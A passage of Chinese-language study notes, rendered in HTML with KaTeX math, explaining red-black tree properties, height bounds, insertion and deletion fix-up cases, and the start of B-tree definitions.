class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。可以证明，含有 <code>n</code> 个结点的平衡二叉树的最大深度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log_{2}n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，因此平衡二叉树的平均查找长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log_{2}n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p>
</li>
</ol>
<h4> 红黑树</h4>
<ol>
<li>
<p><strong>红黑树的定义</strong></p>
<p>为了保持 AVL 树的平衡性，插入和删除操作后，非常频繁地调整全树整体拓扑结构，代价较大。为此在 AVL 树的平衡标准上进一步放宽条件，引入了红黑树的结构。</p>
<p>一棵红黑树是满足如下 <strong>红黑性质</strong> 的二叉排序树：</p>
<ol>
<li>每个结点或是红色，或是黑色的</li>
<li>根结点是黑色的</li>
<li>叶结点（虚构的外部结点、NULL 结点）都是黑色的</li>
<li>不存在两个相邻的红结点（即红结点的父结点和孩子结点均是黑色的）</li>
<li>对每个结点，从该结点到任意一个叶结点的简单路径上，所含黑结点的数量相同</li>
</ol>
<p>与折半查找树和 <code>B</code> 树类似，为了便于对红黑树的实现和理解，引入了 <code>n + 1</code> 个外部叶结点， 以保证红黑树中每个结点（内部结点）的左、右孩子均非空。</p>
<p>从某结点出发（不含该结点）到达一个叶结点的任意一个简单路径上的黑结点总数称为该结点的 <strong>黑高</strong>（记为 <code>bh</code>），黑高的概念是由性质 <code>5</code> 确定的。根结点的黑高称为 <strong>红黑树的黑高</strong>。</p>
<blockquote>
<p><strong>结论 1：从根到叶结点的最长路径不大于最短路径的 2 倍</strong></p>
</blockquote>
<p>由性质 <code>5</code>，当从根到任意一个叶结点的简单路径最短时，这条路径必然全由黑结点构成。由性质 <code>4</code>，当某条路径最长时，这条路径必然是由黑结点和红结点相间构成的，此时红结点和黑结点的数量相同。</p>
<blockquote>
<p><strong>结论 2：有 n 个内部结点的红黑树的高度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>⩽</mo><mn>2</mn><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>l</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h \leqslant 2 log_{2} (n + l)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8311em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span></span></span></span></strong></p>
</blockquote>
<p><strong>证明</strong>：由结论 <code>1</code> 可知，从根到叶结点（不含叶结点）的任何一条简单路径上都至少有一半是黑结点，因此，根的黑高至少为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">h / 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">h</span><span class="mord">/2</span></span></span></span>，于是有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>⩾</mo><msup><mn>2</mn><mrow><mi>h</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n \geqslant 2^{h/2} -1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9713em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span><span class="mord mtight">/2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，即可求得结论。</p>
<p>可见，红黑树的 “适度平衡”，由 AVL 树的 “高度平衡”，降低到 “任意一个结点左右子树的高度，相差不超过 <code>2</code> 倍”，也降低了动态操作时调整的频率。对于一棵动态查找树，如果插入和删除操作比较少，查找操作比较多，采用 AVL 树比较合适，否则采用红黑树更合适。但由于维护这种高度平衡所付出的代价比获得的效益大得多，红黑树的实际应用更广泛，C++ 中的 <code>map</code> 和 <code>set</code>（Java 中的 <code>TreeMap</code> 和 <code>TreeSet</code>）就是用红黑树实现的。</p>
</li>
<li>
<p><strong>红黑树的插入</strong></p>
<p>红黑树的插入过程和二叉查找树的插入过程基本类似，不同之处在于，在红黑树中插入新结点后需要进行调整（主要通过重新着色或旋转操作进行），以满足红黑树的性质。</p>
<blockquote>
<p><strong>结论 3：新插入红黑树中的结点初始着为红色</strong></p>
</blockquote>
<p>假设新插入的结点初始着为黑色，那么这个结点所在的路径比其他路径多出一个黑结点（几乎每次插入都破坏性质 <code>5</code>），调整起来也比较麻烦。如果插入的结点是红色的，此时所有路径上的黑结点数量不变，仅在出现连续两个红结点时才需要调整，而且这种调整也比较简单。</p>
<p>设结点 <code>z</code> 为新插入的结点。<strong>插入过程描述如下：</strong></p>
<ul>
<li>用二叉查找树插入法插入，并将结点 <code>z</code> 着为红色。若结点 <code>z</code> 的父结点是黑色的，无须做任何调整，此时就是一棵标准的红黑树。</li>
<li>如果结点 <code>z</code> 是根结点，将 <code>z</code> 着为黑色（树的黑高增 <code>1</code>），结束</li>
<li>如果结点 <code>z</code> 不是根结点，并且 <code>z</code> 的父结点 <code>z.p</code> 是红色的，则分为下面三种情况，区别在于 <code>z</code> 的叔结点 <code>y</code> 的颜色不同，因 <code>z.p</code> 是红色的，插入前的树是合法的，根据性质 <code>2</code> 和 <code>4</code>，爷结点 <code>z.p.p</code> 必然存在且为黑色。性质 <code>4</code> 只在 <code>z</code> 和 <code>z.p</code> 之间被破坏了
<ul>
<li><strong>情况 1</strong>：<code>z</code> 的叔结点 <code>y</code> 是黑色的，且 <code>z</code> 是一个右孩子</li>
<li><strong>情况 2</strong>：<code>z</code> 的叔结点 <code>y</code> 是黑色的，且 <code>z</code> 是一个左孩子</li>
<li><strong>情况 3</strong>：如果 <code>z</code> 的叔结点 <code>y</code> 是红色</li>
</ul>
</li>
</ul>
<p>每棵子树 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">T_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">T_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">T_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">T_{4}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 都有一个黑色根结点，且具有相同的黑高。</p>
<p><strong>情况 1</strong>（LR，先左旋，再右旋），即 <code>z</code> 是其爷结点的左孩子的右孩子。先做一次左旋将此情形转变为情况 2（变为情况 2 后再做一次右旋），左旋后 <code>z</code> 和父结点 <code>z.p</code> 交换位置。因为 <code>z</code> 和 <code>z.p</code> 都是红色的，所以左旋操作对结点的黑高和性质 <code>5</code> 都无影响。</p>
<p><strong>情况 2</strong>（LL，右单旋），即 <code>z</code> 是其爷结点的左孩子的左孩子。做一次右旋，并交换 <code>z</code> 的原父结点和原爷结点的颜色，就可以保持性质 <code>5</code>，也不会改变树的黑高。这样，红黑树中也不再有连续两个红结点，结束。</p>
<div class="hint-container info">
<p class="hint-container-title">相关信息</p>
<p>若父结点 <code>z.p</code> 是爷结点 <code>z.p.p</code> 的右孩子，则还有两种对称的情况：<code>RL</code>（先右旋，再左旋）和 <code>RR</code>（左单旋）。红黑树的调整方法和 AVL 树的调整方法有异曲同工之妙</p>
</div>
<p><strong>情况 3</strong>（<code>z</code> 是左孩子或右孩子无影响），<code>z</code> 的父结点 <code>z.p</code> 和叔结点 <code>y</code> 都是红色的，因为爷结点 <code>z.p.p</code> 是黑色的，将 <code>z.p</code> 和 <code>y</code> 都着为黑色，将 <code>z.p.p</code> 着为红色，以在局部保持性质 <code>4</code> 和 <code>5</code>。然后，把 <code>z.p.p</code> 作为新结点 <code>z</code> 来重复循环，指针 <code>z</code> 在树中上移两层。</p>
<div class="hint-container info">
<p class="hint-container-title">相关信息</p>
<p>若父结点 <code>z.p</code> 是爷结点 <code>z.p.p</code> 的右孩子，也还有两种对称的情况</p>
</div>
<p>只要满足情况 3 的条件，就会不断循环，每次循环指针 <code>z</code> 都会上移两层，直到满足 <code>2</code>（表示 <code>z</code> 上移到根结点）或情况 <code>1</code> 或情况 <code>2</code> 的条件。</p>
<p>虽然插入的初始位置一定是红黑树的某个叶结点，但因为在情况 3 中，结点 <code>z</code> 存在不断上升的可能，所以对于三种情况，结点 <code>z</code> 都有存在子树的可能。</p>
</li>
<li>
<p><strong>红黑树的删除</strong></p>
<p>红黑树的插入操作容易导致连续的两个红结点，破坏性质 <code>4</code>。而删除操作容易造成子树黑高的变化（删除黑结点会导致根结点到叶结点间的黑结点数量减少），破坏性质 <code>5</code>。</p>
<p>删除过程也是先执行二叉查找树的删除方法。若待删结点有两个孩子，不能直接删除，而要找到该结点的中序后继（或前驱）填补，即右子树中最小的结点，然后转换为删除该后继结点。由于后继结点至多只有一个孩子，这样就转换为待删结点是终端结点或仅有一个孩子的情况。</p>
<p>最终，删除一个结点有以下两种情况：</p>
<ul>
<li>待删结点只有右子树或左子树</li>
<li>待删结点没有孩子</li>
</ul>
<ol>
<li>
<p>如果待删结点只有右子树或左子树，则只有两种情况</p>
<p>只有这两种情况存在。子树只有一个结点，且必然是红色，否则会破坏性质 <code>5</code>。</p>
</li>
<li>
<p>如果待删结点没有孩子，若该结点是红色的，直接删除，无须做任何调整</p>
</li>
<li>
<p>如果待删结点没有孩子，并且该结点是黑色的。假设待删结点为 <code>y</code>，<code>x</code> 是用来替换 <code>y</code> 的结点（注意，当 <code>y</code> 是终端结点时，<code>x</code> 是黑色的 NULL 结点）。删除 <code>y</code> 后将导致先前包含 <code>y</code> 的任何路径上的黑结点数量减 <code>1</code>，因此 <code>y</code> 的任何祖先都不再满足性质 <code>5</code>，简单的修正办法就是将替换 <code>y</code> 的结点 <code>x</code> 视为还有额外一重黑色，定义为 <strong>双黑结点</strong>。也就是说，如果将任何包含结点 <code>x</code> 的路径上的黑结点数量加 <code>1</code>，在此假设下，性质 <code>5</code> 得到满足，但破坏了性质 <code>1</code>。于是，删除操作的任务就转化为将双黑结点恢复为普通结点</p>
</li>
</ol>
<p>分为以下四种情况，区别在于 <code>x</code> 的兄弟结点 <code>w</code> 及 <code>w</code> 的孩子结点的颜色不同。</p>
<ul>
<li><strong>情况 1</strong>：<code>x</code> 的兄弟结点 <code>w</code> 是红色的</li>
<li><strong>情况 2</strong>：<code>x</code> 的兄弟结点 <code>w</code> 是黑色的，且 <code>w</code> 的右孩子是红色的</li>
<li><strong>情况 3</strong>：<code>x</code> 的兄弟结点 <code>w</code> 是黑色的，<code>w</code> 的左孩子是红色的，<code>w</code> 的右孩子是黑色的</li>
<li><strong>情况 4</strong>: <code>x</code> 的兄弟结点 <code>w</code> 是黑色的，且 <code>w</code> 的两个孩子结点都是黑色的</li>
</ul>
<p><strong>情况 1</strong>，<code>w</code> 必须有黑色左右孩子和父结点。交换 <code>w</code> 和父结点 <code>x.p</code> 的颜色，然后对 <code>x.p</code> 做一次左旋，而不会破坏红黑树的任何规则。现在，<code>x</code> 的新兄弟结点是旋转之前 <code>w</code> 的某个孩子结点，其颜色为黑色，这样，就将情况 1 转换为情况 2、3 或 4 处理。</p>
<p><strong>情况 2</strong>（RR，左单旋），即这个红结点是其爷结点的右孩子的右孩子。交换 <code>w</code> 和父结点 <code>x.p</code> 的颜色，把 <code>w</code> 的右孩子着为黑色，并对 <code>x</code> 的父结点 <code>x.p</code> 做一次左旋，将 <code>x</code> 变为单重黑色，此时不再破坏红黑树的任何性质，结束。</p>
<p><strong>情况 3</strong>（RL，先右旋，再左旋），即这个红结点是其爷结点的右孩子的左孩子。交换 <code>w</code> 和其左孩子的颜色，然后对 <code>w</code> 做一次右旋，而不破坏红黑树的任何性质。现在，<code>x</code> 的新兄弟结点 <code>w</code> 的右孩子是红色的，这样就将情况 3 转换为了情况 2。</p>
<p><strong>情况 4</strong> 中，因 <code>w</code> 也是黑色的，故可从 <code>x</code> 和 <code>w</code> 上去掉一重黑色，使得 <code>x</code> 只有一重黑色而 <code>w</code> 变为红色。为了补偿从 <code>x</code> 和 <code>w</code> 中去掉的一重黑色，把 <code>x</code> 的父结点 <code>x.p</code> 额外着一层黑色，以保持局部的黑高不变。通过将 <code>x.p</code> 作为新结点 <code>x</code> 来循环，<code>x</code> 上升一层。如果是通过情况 1 进入情况 4 将新结点 <code>x</code> 变为黑色，终止循环，结束。</p>
<p>若 <code>x</code> 是父结点 <code>x.p</code> 的右孩子，则还有四种对称的情况，处理方式类似。</p>
<p><strong>归纳总结</strong>：在情况 4 中，因 <code>x</code> 的兄弟结点 <code>w</code> 及左右孩子都是黑色，可以从 <code>x</code> 和 <code>w</code> 中各提取一重黑色（以让 <code>x</code> 变为普通黑结点），不会破坏性质 <code>4</code>，并把调整任务向上 “推” 给它们的父结点 <code>x.p</code>。在情况 1、2 和 3 中，因为 <code>x</code> 的兄弟结点 <code>w</code> 或 <code>w</code> 左右孩子中有红结点，所以只能在 <code>x.p</code> 子树内用调整和重新着色的方式，且不能改变 <code>x</code> 原根结点的颜色（否则向上可能破坏性质 <code>4</code>）。情况 1 虽然可能会转换为情况 4，但因为新 <code>x</code> 的父结点 <code>x.p</code> 是红色的，所以执行一次情况 4 就会结束。情况 1、2 和 3 在各执行常数次的颜色改变和至多 3 次旋转后便终止，情况 4 是可能重复执行的唯一情况，每执行一次指针 <code>x</code> 上升一层，至多 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log_{2}n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 次。</p>
</li>
</ol>
<h3> B 树和 B+ 树</h3>
<h4> B 树及其基本操作</h4>
<p>所谓 <code>m</code> 阶 B 树是所有结点的平衡因子均等于 <code>0</code> 的 <code>m</code> 路平衡查找树。</p>
<p>一棵成阶 B 树或为空树，或为 <strong>满足如下特性</strong> 的 <code>m</code> 叉树：</p>
<ol>
<li>
<p>树中每个结点至多有 <code>m</code> 棵子树，即至多含有 <code>m - 1</code> 个关键字</p>
</li>
<li>
<p>若根结点不是叶结点，则至少有两棵子树</p>
</li>
<li>
<p>除根结点外的所有非叶结点至少有 <code>[m / 2]</code> 棵子树，即至少含有 <code>[m / 2] - 1</code> 个关键字</p>
</li>
<li>
<p>所有非叶结点的结构如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></th>
<th style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">P_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></th>
<th style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">K_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></th>
<th style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">P_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></th>
<th style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">K_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></th>
<th style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">P_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></th>
<th style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>…</mo></mrow><annotation encoding="application/x-tex">\dotsc</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.123em;"></span><span class="minner">…</span></span></span></span></th>
<th style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">K_{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></th>
